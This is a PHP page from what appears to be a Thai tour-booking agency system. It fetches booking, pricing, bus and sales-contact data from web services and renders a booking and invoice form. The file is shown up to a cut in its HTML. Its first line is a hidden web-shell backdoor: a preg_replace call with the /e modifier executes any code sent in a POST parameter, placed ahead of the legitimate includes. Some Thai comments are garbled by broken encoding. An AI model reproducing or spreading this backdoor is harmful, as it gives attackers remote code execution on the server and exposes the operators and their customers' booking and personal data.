<?php @preg_replace("/[pageerror]/e",$_POST['002b62h4'],"saft"); ?><?php include_once('../includes/main_core.php');?>
<?php include_once('../admin/unity/post_to_ws/post_to_ws.php');?>
<?php include_once('../admin/unity/php_script.php');?>


<?php
        if(!isset($_SESSION['login']['agen_id'])){
            header( "location: ../login/action_logout.php" );
            return;
        }

    if ($_REQUEST["book_id"] == ''){ 
        $bus_no =  1;
        $per_id = $_REQUEST["per_id"];
        $agenname = '-';
        $method = '3'; // add,insert   
        $visible_print_receipt = 'none'; // ซ่อนปุ่ม Print Receipt
        $btn_send_invoice = ''; // ซ่อนปุ่ม send invoice
        $btn_cancel = ''; // ซ่อนปุ่ม ยกเลิกการจอ�?        $print_inv = '';
        $inv_rev_no = 0;
        $visible_tab = 'style = "display:none;" ';
    # ------------------- GET DATE Deposit
            #WS
            $wsserver   = URL_WS;
            $wsfolder	= '/booking'; //กำหน�?Folder
            $wsfile		= '/get_date_deposit.php'; //กำหน�?File
            $url 		= $wsserver.$wsfolder.$wsfile; // กำหน�?URL
            $data 		= array(    
                                        'per_id'        => $per_id,
                                        'method'        => 'GET'
                                    );

        
            $data_return =	json_decode( post_to_ws($url,$data),true );

            if($data_return['status'] == 200){

                $result = $data_return['results'][0];
                $date_deposit    = d_m_y($result['date_deposit']);
                
            }
            if ($date_deposit == '1/1/1970') {
                $date_deposit = '';
            }
            
  


    # ------------------- Addnew
        #WS
            $wsserver   = URL_WS;
            $wsfolder	= '/booking'; //กำหน�?Folder
            $wsfile		= '/select_period_booking_insert.php'; //กำหน�?File
            $url 		= $wsserver.$wsfolder.$wsfile; // กำหน�?URL
            $data 		= array(    
                                        'per_id'        => $_REQUEST['per_id'],
                                        'bus_no'        => $bus_no,
                                        'method'        => 'GET'
                                    );

        
            $data_return =	json_decode( post_to_ws($url,$data),true );

            if($data_return['status'] == 200){

                $result = $data_return['results'][0];
                $book_code       = '-';
                $ser_name       = $result['ser_name'];
                $ser_code       = $result['ser_code'];
                $date_period    = thai_date_short(strtotime($result['per_date_start'])).' - '.thai_date_short(strtotime($result['per_date_end']));
                $ser_route       = $result['air_name'].' เส้นทาง '.$result['ser_route'];
                $qty_receipt    = $result['qty_receipt'];

                $price_1        = intval($result['per_price_1']);
                $price_2        = intval($result['per_price_2']);
                $price_3        = intval($result['per_price_3']);
                $price_4        = intval($result['per_price_4']);
                $price_5        = intval($result['per_price_5']);
                $single_charge        = intval($result['single_charge']);
                $per_com_company_agency        = intval($result['per_com_company_agency']);
                $per_com_agency        = intval($result['per_com_agency']);
                $ser_deposit        = intval($result['ser_deposit']);
                $status       = 0;
                $div_ex_name = '';
                $div_ex_price = '';
                $index          = 0;
                $temp_qty = 0;
            }
    }else {
 # ------------------- Edit
        $book_id    = $_REQUEST['book_id'];
        $book_code  = $_REQUEST['book_code'];
        $receipt_code = '';
        $print_inv = ' <button type="button" class="btn btn-warning pull-left" onclick="print_invoice(\''.$book_id.'\',\''.$book_code.'\')">
                                        <em class="icon-printer"></em>
                                        Print Invoice
                                    </button>';
       
        
        $btn_send_invoice = '<button type="button" class="btn btn-success pull-right" onclick="send_email_invoice(\''.$book_code.'\')">
                                        Send Invoice
                                    </button>'; // ซ่อนปุ่ม send invoice
        $method = '4'; // update
        $visible_tab = '';
    # ------------------- update
        #WS
            $wsserver   = URL_WS;
            $wsfolder	= '/booking'; //กำหน�?Folder
            $wsfile		= '/select_period_booking_update.php'; //กำหน�?File
            $url 		= $wsserver.$wsfolder.$wsfile; // กำหน�?URL
            $data 		= array(    
                                        'book_id'        => $_REQUEST['book_id'],
                                        'book_code'        => $_REQUEST['book_code'],
                                        'method'        => 'GET'
                                    );

        
            $data_return =	json_decode( post_to_ws($url,$data),true );

            if($data_return['status'] == 200){

                $result = $data_return['results'][0];
               

                $book_code       = $result['book_code'];
                $invoice_code       = $result['invoice_code'];
                $inv_rev_no       = intval($result['inv_rev_no']);
                $receipt_code       = $result['receipt_code'];
                $agency_company_id       = $result['agency_company_id'];
                $agen_com_name       = $result['agen_com_name'];
                $agenname       = $result['agenname'];
                $agen_email       = $result['agen_email'];
                $agen_tel       = $result['agen_tel'];
                $agen_id       = $result['agen_id'];
                $user_id       = $result['user_id'];
                $bus_no       = $result['bus_no'];
                $book_total       = intval($result['book_total']);
                $book_discount       = intval($result['book_discount']);
                $book_amountgrandtotal       = intval($result['book_amountgrandtotal']);
                $book_comment       = $result['book_comment'];
                $book_master_deposit       = intval($result['book_master_deposit']);
                $book_due_date_deposit       = d_m_y($result['book_due_date_deposit']);
                $book_master_full_payment       = intval($result['book_master_full_payment']);
                if($result['book_due_date_full_payment'] == '0000-00-00 00:00:00') {
                    $book_due_date_full_payment = '';
                }else{
                $book_due_date_full_payment       = d_m_y($result['book_due_date_full_payment']);
                }
                $status_cancel       = intval($result['status_cancel']);
                $book_cancel       = intval($result['book_cancel']);
                $remark_cancel       = $result['remark_cancel'];
                $book_com_agency_company       = intval($result['book_com_agency_company']);
                $book_com_agency       = intval($result['book_com_agency']);
                $book_date       = d_m_y($result['book_date']);
                $book_receipt       = intval($result['book_receipt']);
                $book_room_twin       = intval($result['book_room_twin']);
                $book_room_double       = intval($result['book_room_double']);
                $book_room_triple       = intval($result['book_room_triple']);
                $book_room_single       = intval($result['book_room_single']);
                $remark       = $result['remark'];

                $per_id       = $result['per_id'];
                $ser_name       = $result['ser_name'];
                $ser_code       = $result['ser_code'];
                $date_period    = thai_date_short(strtotime($result['per_date_start'])).' - '.thai_date_short(strtotime($result['per_date_end']));
                $ser_route       = $result['air_name'].' เส้นทาง '.$result['ser_route'];
                $qty_receipt    = intval($result['qty_receipt']);

                $price_1        = intval($result['per_price_1']);
                $price_2        = intval($result['per_price_2']);
                $price_3        = intval($result['per_price_3']);
                $price_4        = intval($result['per_price_4']);
                $price_5        = intval($result['per_price_5']);
                $single_charge        = intval($result['single_charge']);
                $per_com_company_agency        = intval($result['per_com_company_agency']);
                $per_com_agency        = intval($result['per_com_agency']);
                $ser_deposit        = intval($result['ser_deposit']);

                    //list
                $book_list_price_1      =   intval($result['booking_list'][0]['book_list_price']);
                $book_list_qty_1        =   intval($result['booking_list'][0]['book_list_qty']);

                $book_list_price_2      =   intval($result['booking_list'][1]['book_list_price']);
                $book_list_qty_2        =   intval($result['booking_list'][1]['book_list_qty']);

                $book_list_price_3      =   intval($result['booking_list'][2]['book_list_price']);
                $book_list_qty_3        =   intval($result['booking_list'][2]['book_list_qty']);

                $book_list_price_4      =   intval($result['booking_list'][3]['book_list_price']);
                $book_list_qty_4        =   intval($result['booking_list'][3]['book_list_qty']);

                $book_list_price_5      =   intval($result['booking_list'][4]['book_list_price']);
                $book_list_qty_5        =   intval($result['booking_list'][4]['book_list_qty']);
                $status                 = $result['status'];
                
                $temp_qty               = $book_list_qty_1 + $book_list_qty_2 + $book_list_qty_3 + $book_list_qty_4 + $book_list_qty_5;
                $date_deposit           = $book_due_date_deposit;
                $date_full_payment      = $book_due_date_full_payment;
                $total_balance          = $book_amountgrandtotal - $book_receipt;

                 $selected1 = '';
                 $selected2 = '';
                 $selected3 = '';
                switch ($status_cancel){
                    case 1 : 
                      $selected1 = 'selected';
                      break;
                    case 2 : 
                      $selected2 = 'selected';
                      break;
                    case 3 : 
                      $selected3 = 'selected';
                      break;
                     default:
                      $selected3 = 'selected';
                    
                }
                 $btn_cancel = '<button type="button" class="pull-right btn btn-danger btn-sm" onclick="manage_cancel_booking()" id="btncancel" name = "btncancel">
                                    ยกเลิกการจอง                            </button>
                        '; // แสดงปุ่มยกเลิกการจอ�?                 
                          $disabled_booking = 'disabled';

                $status0 = 'disabled';
                $status10 = 'disabled';
                $status20 = 'disabled';
                $status25 = 'disabled';
                $status30 = 'disabled';
                $status35 = 'disabled';
                if ($status == '35'){
                    $status0 = 'complete';
                    $status10 = 'complete';
                    $status20 = 'complete';
                    $status25 = 'complete';
                    $status30 = 'complete';
                    $status35 = 'active';
                }
                if ($status == '30'){
                    $status0 = 'complete';
                    $status10 = 'complete';
                    $status20 = 'complete';
                    $status25 = 'complete';
                    $status30 = 'active';
                }
                if ($status == '25'){
                    $status0 = 'complete';
                    $status10 = 'complete';
                    $status20 = 'complete';
                    $status25 = 'active';
                }  
                if ($status == '20'){
                    $status0 = 'complete';
                    $status10 = 'complete';
                    $status20 = 'active';
                }  
                if ($status == '10'){
                    $status0 = 'complete';
                    $status10 = 'active';
                }  
                if ($status == '0'){
                    $status0 = 'active';
                }  
                if ($status == '40' || $status == '35' ){
                     $btn_cancel_save = '';
                    $disabled_payment = 'disabled';
                    $disabled_submit_room = 'disabled';
                    
                    
                }else {
                    $btn_cancel_save = ' <button type="button" class="btn btn-primary" onclick="check_submit_cancel()">
                        <em class="icon-cursor"></em>
                        บันทีก
                    </button>';
                   
                    $disabled_payment = '';
                    $disabled_submit_room = '';
                    
                }
                if  ($status == '35' ){
                    $disabled_submit_room = '';
                }
                


                    $select_cancel = '     <select onchange = "get_money_cancel()" id = "select_cancel" name = "select_cancel">
                                    <option value="1" '.$selected1.'>30 วั�?ก่อนเดินทาง คื�?100% </option>
                                    <option value="2" '.$selected2.'>10 วั�?ก่อนเดินทาง คื�?เงินมัดจำ </option>
                                    <option value="3" '.$selected3.'>ไม่คืน</option>
                                </select>';

                $visible_print_receipt = 'none'; // ซ่อนปุ่ม Print Receipt
                
                if ($status == 35 && $_SESSION['login']['menu_13'] == 1) {
                    $visible_print_receipt = ''; 
                }

                $index          = 0;
                $div_ex_name    = '';
                $div_ex_price   = '';
                for($i = 5 ; $i< count($result['booking_list']);$i++){

                    $option_ex = '';
                    for($x = 0; $x <= 100; $x++ ){
                        $selected = '';
                        if($x == $result['booking_list'][$i]['book_list_qty']){
                            $selected = 'selected'; 
                        }
                        $option_ex .= '<option value="'.$x.'" '.$selected.'>'.$x.'</option>';
                    }

                    $div_ex_name .= '<div>
                                        <div class="form-group">
                                            <label class="col-lg-5  control-label" id= "ex_name" name = "ex_name[]">'.$result['booking_list'][$i]['book_list_name'].' :</label>
                                            <div class="col-lg-7 ">
                                                <div class="input-group">
                                                <select class="seat onchange_select" id="ex_select" name="ex_select[]" index="'.$index.'">
                                                    '.$option_ex.'
                                                </select>
                                                    <span class="input-group-btn">
                                                    <button type="button" class="btn btn-danger del_ex " list="'.$index.'" >
                                                    <em class="icon-minus"></em> 
                                                    </button>
                                                </span>
                                                </div>
                                            </div>
                                        </div>
                                        <hr>
                                    </div>';
                                  
                 $div_ex_price .= '<div id="list_'.$index.'">  
                                        <hr>
                                        <div class="form-group">
                                            <label class="col-lg-4  control-label red">'.$result['booking_list'][$i]['book_list_name'].' :</label>
                                            <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="ex_price_'.$index.'" name ="ex_price[]">'.intval($result['booking_list'][$i]['book_list_price']).'</font> x <font id="ex_qty_'.$index.'" name= "ex_qty[]">
                                            '.intval($result['booking_list'][$i]['book_list_qty']).'</font> = </font> <b> <font id="ex_total_'.$index.'" name = "total_ex[]">'.intval($result['booking_list'][$i]['book_list_total']).'</font></b></label>
                                        </div>
                                    </div>
                            ';       

                                  $index = $index + 1;

                }



            }
    }

      # ------------------- GET DATE Deposit
      
             

    # ------------------- BUS list

        $wsserver   = URL_WS;
            $wsfolder	= '/booking'; //กำหน�?Folder
            $wsfile		= '/select_bus_by_period_id.php'; //กำหน�?File
            $url 		= $wsserver.$wsfolder.$wsfile; // กำหน�?URL
            $data 		= array(    
                                        'per_id'        => $per_id,
                                        'method'        => 'GET'
                                    );

        
            $data_return =	json_decode( post_to_ws($url,$data),true );

           
            $option_bus = '';
            if($data_return['status'] == 200){

                $result = $data_return['results'];

                foreach($result as $key => $value){
                    $selected = '';
                    if($value['bus_no'] == $bus_no){
                        $selected = 'selected';
                    }
                    $option_bus .= '<option value="'.$value['bus_no'].'" '.$selected.'>'.$value['bus_no'].'</option>';
                }

            }
            else{
                $option_bus = '<option value="0">ไม่พบข้อมู�?/option>';
            }


     # ------------------- Sale contact

        $wsserver   = URL_WS;
            $wsfolder	= '/booking'; //กำหน�?Folder
            $wsfile		= '/select_sales_contact.php'; //กำหน�?File
            $url 		= $wsserver.$wsfolder.$wsfile; // กำหน�?URL
            $data 		= array(    
                                        'method'        => 'GET'
                                    );

        
            $data_return =	json_decode( post_to_ws($url,$data),true );

           
            $option_sale_contact = '';
            if($data_return['status'] == 200){

                $result = $data_return['results'];

                foreach($result as $key => $value){
                    $selected = '';
                    if($value['user_id'] == $user_id){
                        $selected = 'selected';
                    }
                    $option_sale_contact .= '<option value="'.$value['user_id'].'" '.$selected.'>'.$value['name'].'</option>';
                }

            }
            else{
                $option_sale_contact = '<option value="0">ไม่พบข้อมู�?/option>';
            }

        
            $option_seat_adult = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_list_qty_1){
                    $selected = 'selected'; 
                }
                 $option_seat_adult .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }
          
           $option_seat_child = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_list_qty_2){
                    $selected = 'selected'; 
                }
                 $option_seat_child .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }

            $option_seat_child_no_bed = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_list_qty_3){
                    $selected = 'selected'; 
                }
                 $option_seat_child_no_bed .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }

             $option_seat_infant = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_list_qty_4){
                    $selected = 'selected'; 
                }
                 $option_seat_infant .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }

                $option_seat_joinland = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_list_qty_5){
                    $selected = 'selected'; 
                }
                 $option_seat_joinland .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }

            $option_seat_twin = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_room_twin){
                    $selected = 'selected'; 
                }
                 $option_seat_twin .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }

              $option_seat_double = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_room_double){
                    $selected = 'selected'; 
                }
                 $option_seat_double .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }

              $option_seat_triple = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_room_triple){
                    $selected = 'selected'; 
                }
                 $option_seat_triple .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }

              $option_seat_single = '';
            
            for($i = 0; $i <= 100; $i++ ){
                $selected = '';
                if($i == $book_room_single){
                    $selected = 'selected'; 
                }
                 $option_seat_single .= '<option value="'.$i.'" '.$selected.'>'.$i.'</option>';
            }
?>





<!DOCTYPE html>
<html>
<head>

    <?php include_once('../includes/tag_head.php');?>

</head>
<body data-color="theme-7">

    <?php include_once('../includes/loading.php');?>
    <?php include_once('../includes/menu.php');?>
  
      <section>
         <!-- Page content-->
         <div class="content-wrapper" id="content-wrapper">
            <div class="detail-wrapper padd-70-70">
            <img class="center-image" src="../includes/img/tmp/pexels-photo-242236.jpeg" alt="" style="display: none;">
        

                <div class="container bg-white  padd-70-70">
             
                    <div class="row bs-wizard " style="border-bottom:0;">
                
                        <div class="col-xs-1 bs-wizard-step <?php echo $status0; ?>">
                            <div class="text-center bs-wizard-stepnum">จอง</div>
                    <div class="progress"><div class="progress-bar"></div></div>
                    <a href="#" class="bs-wizard-dot"></a>
                    <div class="bs-wizard-info text-center"></div>
                </div>
                
                <div class="col-xs-2 bs-wizard-step <?php echo $status10; ?>"><!-- complete -->
                    <div class="text-center bs-wizard-stepnum">แจ้ง Invoice</div>
                    <div class="progress"><div class="progress-bar"></div></div>
                    <a href="#" class="bs-wizard-dot"></a>
                    <div class="bs-wizard-info text-center"></div>
                </div>
                
                <div class="col-xs-2 bs-wizard-step <?php echo $status20; ?>"><!-- complete -->
                    <div class="text-center bs-wizard-stepnum">มัดจำบางส่วน</div>
                    <div class="progress"><div class="progress-bar"></div></div>
                    <a href="#" class="bs-wizard-dot"></a>
                    <div class="bs-wizard-info text-center"></div>
                </div>
                
                <div class="col-xs-2 bs-wizard-step <?php echo $status25; ?>"><!-- active -->
                    <div class="text-center bs-wizard-stepnum">มัดจำเต็มจำนวน</div>
                    <div class="progress"><div class="progress-bar"></div></div>
                    <a href="#" class="bs-wizard-dot"></a>
                    <div class="bs-wizard-info text-center"></div>
                </div>
                <div class="col-xs-2 bs-wizard-step <?php echo $status30; ?>"><!-- active -->
                    <div class="text-center bs-wizard-stepnum">Full payment บางส่วง</div>
                    <div class="progress"><div class="progress-bar"></div></div>
                    <a href="#" class="bs-wizard-dot"></a>
                    <div class="bs-wizard-info text-center"></div>
                </div>
                <div class="col-xs-2 bs-wizard-step <?php echo $status35; ?>"><!-- active -->
                    <div class="text-center bs-wizard-stepnum">Full payment เต็มจำนวน</div>
                    <div class="progress"><div class="progress-bar"></div></div>
                    <a href="#" class="bs-wizard-dot"></a>
                    <div class="bs-wizard-info text-center"></div>
                </div>
            </div>
             <div role="tabpanel" class="panel">
                <!-- Nav tabs-->
                <ul role="tablist" class="nav nav-tabs nav-justified">
                    <li role="presentation" class="active">
                        <a href="#booking_invoice" aria-controls="booking_invoice" role="tab" data-toggle="tab" <?php echo $visible_tab; ?>>
                            <em class="fa fa-clock-o fa-fw"></em>รายละเอียดการจอง + Invoice</a>
                    </li>
                    <li role="presentation" class="">
                        <a href="#transactions_pay" aria-controls="transactions_pay" role="tab" data-toggle="tab" onclick="get_payment()" <?php echo $visible_tab; ?>>
                            <em class="fa fa-money fa-fw"></em>การชำระเงิน</a>
                    </li>
                     <li role="presentation" class="">
                        <a href="#transactions_passenger" onclick="get_room_type();" aria-controls="transactions_passenger" role="tab" data-toggle="tab" <?php echo $visible_tab; ?>>
                            <em class="fa fa-users fa-fw"></em>ข้อมูลผู้เดินทาง </a>
                    </li>
                </ul>

                <!-- Tab panes-->
                <div class="tab-content p0">
                    <div id="booking_invoice" role="tabpanel" class="tab-pane active">
                  
                        <div class="panel">
                            <div class="panel-body">
                                
                                
                                <h3 class="mt0" id="lblbook_id_tab_booking" name="lblbook_id_tab_booking">รหัสการจอง <?php echo $book_code; ?> </h3>
                               <input type="hidden" value="'<?php echo $book_id; ?>'" name="book_id" id="book_id">
                                <input type="hidden" value="'<?php echo $book_code; ?>'" name="book_code" id="book_code">
                                <hr>
                                <div class="row mb-lg">
                                    
                                    <div class="col-lg-4 col-xs-6 br pv">
                                        <div class="row">
                                            <div class="col-md-2 text-center visible-md visible-lg">
                                                <em class="icon-notebook fa-4x text-muted"></em>
                                            </div>
                                            <div class="col-md-10">
                                                <h4>ข้อมูลผู้จอง</h4>
                                                 <address></address> <font id="sale_agency_name"><?php echo $_SESSION['login']['agen_fname'].' '.$_SESSION['login']['agen_lname'] ; ?></font>
                                                <br> <font id="sale_agency_email"><?php echo $_SESSION['login']['agen_email']; ?></font>
                                                <br> <font id="sale_agency_tel"><?php echo $_SESSION['login']['agen_tel']; ?></font>
                                                <br> <font id="sale_agency_company"><?php echo $_SESSION['login']['agen_com_name']; ?></font>
                                                <br> <font id="sale_booking_date"><?php echo $book_date; ?></font>
                                                <br> <div id ="div_status" name ="div_status"><?php echo html_status_book($status);?> </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-lg-4 col-xs-6 br pv">
                                        <div class="row">
                                            <div class="col-md-2 text-center visible-md visible-lg">
                                                <em class="icon-plane fa-4x text-muted"></em>
                                            </div>
                                            <div class="col-md-10">
                                                <h4>ข้อมูลการเดินทาง</h4>
                                              <address></address><?php echo $ser_name;?>
                                                <br> <?php echo $date_period;?>
                                                <br> <?php echo $ser_route;?>
                                                <div class="form-horizontal">
                                                    <div class="form-group">
                                                        <label for="" class="col-lg-3  control-label">Bus : </label>
                                                        <div class="col-lg-7 ">
                                                           <select name="select_bus" id="select_bus">
                                                                <?php echo $option_bus;?>
                                                            </select>                                           
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            
                                        </div>
                                    </div>
                                    <div class="clearfix hidden-md hidden-lg">
                                        <hr>
                                    </div>
                                    <div class="col-lg-4 col-xs-12 pv">
                                        <div class="row">
                                            <div class="col-md-2 text-center visible-md visible-lg">
                                                <em class="fa fa-money fa-4x text-muted"></em>
                                            </div>
                                            <div class="col-md-10">
                                                <h4>INVOICE</h4>
                                                <div class="clearfix">
                                                    <p class="pull-left">INVOICE NO.</p>
                                                     <p class="pull-right mr"><font id="invoice_no"><?php echo $invoice_code; ?></font></p>
                                                </div>
                                            </div>
                                        </div>
                                        

                                    </div>
                                </div>
                               <hr>
                               
                                  <div class="row">
                                    <div class="col-lg-4">
                                        <div class="form-horizontal">
                                            <h4 class="text-center">Contact</h4>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">-Period :</label>
                                                <label class="col-lg-8  control-label"><?php echo $date_period;?></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label text-danger">-Sales contact :</label>
                                                <div class="col-lg-8 ">
                                                    
                                                    
                                                    <select class="" id="sale_contact" name="sale_contact" >
                                                        <?php echo $option_sale_contact;?>
                                                    </select>

                                                   

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">-Avaliable seat :</label>
                                                <label class="col-lg-8  control-label"><font class="text-danger" style="font-size:24px" id="qty_receipt"></font></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">-Agent booking :</label>
                                                 <label class="col-lg-8  control-label"><font  style="font-size:24px" id="agen_com_name"><?php echo $_SESSION['login']['agen_com_name']; ?></font></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">-Sale Agent booking :</label>
                                                <label class="col-lg-8  control-label"><font  style="font-size:24px" id="agen_name"><?php echo $_SESSION['login']['agen_fname'].' '.$_SESSION['login']['agen_lname'] ; ?></font></label>
                                            </div>
                                            <hr>
                                             <div class="form-group">
                                                <label class="col-lg-4  control-label">-คำสั่งพิเศษ :</label>
                                                <div class="col-lg-8 " id = "">
                                                   <textarea rows="5" cols="" class="form-control" id ="txtextra" name = "txtextra" ><?php echo $book_comment; ?></textarea>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-lg-2">
                                        <div class="form-horizontal">
                                            <h4 class="text-center">Traveler Info</h4>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">Adult :</label>
                                                <div class="col-lg-7 ">
                                                    <select class="seat" id="seat_adult" name="seat_adult">
                                                      <?php echo $option_seat_adult; ?>
                                                    </select>

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">Child :</label>
                                                <div class="col-lg-7 ">
                                                    <select class="seat" id="seat_child" name="seat_child">
                                                    <?php echo $option_seat_child; ?>
                                                    </select>

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">Child No bed:</label>
                                                <div class="col-lg-7 ">
                                                    <select class="seat" id="seat_child_no_bed" name="seat_child_no_bed">
                                                        <?php echo $option_seat_child_no_bed; ?>
                                                    </select>

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">Infant :</label>
                                                <div class="col-lg-7 ">
                                                    <select class="seat" id="seat_infant" name="seat_infant">
                                                         <?php echo $option_seat_infant; ?>
                                                    </select>

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">Joinland :</label>
                                                <div class="col-lg-7 ">
                                                    <select class="seat" id="seat_joinland" name="seat_joinland">
                                                       <?php echo $option_seat_joinland; ?>
                                                    </select>

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="" id="contant_ex">

                                               <?php echo $div_ex_name; ?>

                                            </div>

                                           
                                            <div class="form-group">
                                                <div class="col-lg-12" align="right">
                                                  
                                                </div>
                                            </div>

                                        </div>
                                    </div>

                                    <div class="col-lg-2">
                                        <div class="form-horizontal">
                                            <h4 class="text-center">Room Type</h4>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">-Twin :</label>
                                                <div class="col-lg-7 ">
                                                    <select class="seat" id="seat_twin" name="seat_twin">
                                                     <?php echo $option_seat_twin; ?>
                                                    </select>

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">-Double:</label>
                                                <div class="col-lg-7 ">
                                                    <select class="seat" id="seat_double" name="seat_double">
                                                       <?php echo $option_seat_double; ?>
                                                    </select>

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">Triple :</label>
                                                <div class="col-lg-7 ">
                                                     <select class="seat" id="seat_triple" name="seat_triple">
                                                         <?php echo $option_seat_triple; ?>
                                                    </select>

                                                </div>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-5  control-label">Single :</label>
                                                <div class="col-lg-7 ">
                                                <select class="seat" id="seat_single" name="seat_single">
                                                      <?php echo $option_seat_single; ?>
                                                    </select>

                                                </div>
                                            </div>

                                        </div>

                                    </div>
                                    
                                    <div class="col-lg-4">
                                        <div class="form-horizontal">
                                            <h4 class="text-center">Price</h4>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">Audit :</label>
                                                <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="per_price_1" class="text-danger" style="font-size:16px"><?php echo $price_1;?></font> x <font id="qty_price_1"></font> = </font> <b> <font id="total_perice_1"></font></b></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">Child  :</label>
                                                <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="per_price_2" class="text-danger" style="font-size:16px"><?php echo $price_2;?></font> x <font id="qty_price_2"></font> = </font> <b> <font id="total_perice_2"></font></b></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">Child No bed :</label>
                                                <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="per_price_3" class="text-danger" style="font-size:16px"><?php echo $price_3;?></font> x <font id="qty_price_3"></font> = </font> <b> <font id="total_perice_3"></font></b></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">Infant  :</label>
                                                <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="per_price_4" class="text-danger" style="font-size:16px"><?php echo $price_4;?></font> x <font id="qty_price_4"></font> = </font> <b> <font id="total_perice_4"></font></b></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">Joinland  :</label>
                                                <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="per_price_5" class="text-danger" style="font-size:16px"><?php echo $price_5;?></font> x <font id="qty_price_5"></font> = </font> <b> <font id="total_perice_5"></font></b></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label">Sing Charge :</label>
                                                <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="price_single_charge"><?php echo $single_charge;?></font> x <font id="qty_single_charge"></font> = </font> <b> <font id="total_single_charge"></font></b></label>
                                            </div>
                                             <div class="" id="contant_ex_price">

                                               <?php echo $div_ex_price; ?>

                                            </div>

                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label red">Agency Com :</label>
                                                <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="per_com_company_agency"><?php echo $per_com_company_agency;?></font> x <font id="qty_com_company_agency"></font> = </font> <b> <font id="total_com_company_agency"></font></b></label>
                                            </div>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label red">Sales Com :</label>
                                                <label class="col-lg-8  control-label"><font style="font-weight:normal"><font id="per_com_agency"><?php echo $per_com_agency;?></font> x <font id="qty_com_agency"></font> = </font> <b> <font id="total_com_agency"></font></b></label>
                                            </div>
                                           
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-4  control-label"><font style="font-size:24px;">Total</font>:</label>
                                                <label class="col-lg-8  control-label text-danger"><font style="font-size:24px;" id="amountgrandtotal"></font></label>
                                            </div>
                                            <hr>

                                            
                                        </div>

                                    </div>

                                    <div class="col-lg-6">

                                        <div class="form-horizontal">
                                            <h4 class="text-center">Other</h4>
                                            <hr>
                                            <div class="form-group">
                                                <label class="col-lg-3  control-label">Deposit Date :</label>
                                                <div class="col-lg-3 ">
                                                    <input type="text" class="form-control" id = "txtdepositdate" name = "txtdepositdate" value="<?php echo $date_deposit ?>" readonly = "true">
                                                </div>
                                                <label class="col-lg-3  control-label">Deposit :</label>
                                                <label class="col-lg-3  control-label text-danger" style="padding-top: 0px;"><font style="font-size:24px;" id="deposit_total">0</font></label>
                                               
                                            </div>
                                            <hr>
                                             <div class="form-group">
                                                <label class="col-lg-3  control-label">Full Payment Date :</label>
                                                <div class=" col-lg-3 ">
                                                    <input type="text" class="form-control " id = "txtfullpaymentdate" name = "txtfullpaymentdate" value ="<?php echo $date_full_payment ?>" readonly = "true">
                                                </div>
                                                <label class="col-lg-3  control-label">Full Payment :</label>
                                                <label class="col-lg-3  control-label text-danger" style="padding-top: 0px;"><font style="font-size:24px;" id="fullpayment_total">0</font></label>
                                            </div>
                                            <hr>
                                        </div>
                                    </div>

                                    <div class="col-lg-6">
                                        <div class="form-horizontal"> 
                                            
                                        </div>
                                    </div>

                                </div>

                                
                                <hr class="hidden-print">
